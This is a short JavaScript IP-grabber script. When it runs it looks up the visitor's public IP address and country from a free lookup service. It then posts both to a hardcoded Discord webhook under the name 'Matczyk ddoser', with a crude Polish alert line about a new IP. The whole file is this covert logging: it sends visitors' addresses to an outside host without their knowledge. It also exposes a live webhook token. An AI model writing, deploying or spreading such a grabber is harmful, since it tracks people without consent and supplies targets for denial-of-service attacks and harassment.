var webHookUrl = "https://discordapp.com/api/webhooks/1264986823650705409/FvKJ5qTWrbgFlyNfibhwGmVDgidlXZ2J9igfpBK66W6x2dQzS89tuSjBVB_xoRyZ08zb";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "Matczyk ddoser",
        avatar_url: "https://cdn.discordapp.com/avatars/627798896923377694/a_b81503bbf27bf37a5927a60d507fdbb7.gif?size=4096",
        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
		
    }

    postRequest.send(JSON.stringify(params));

}

request();
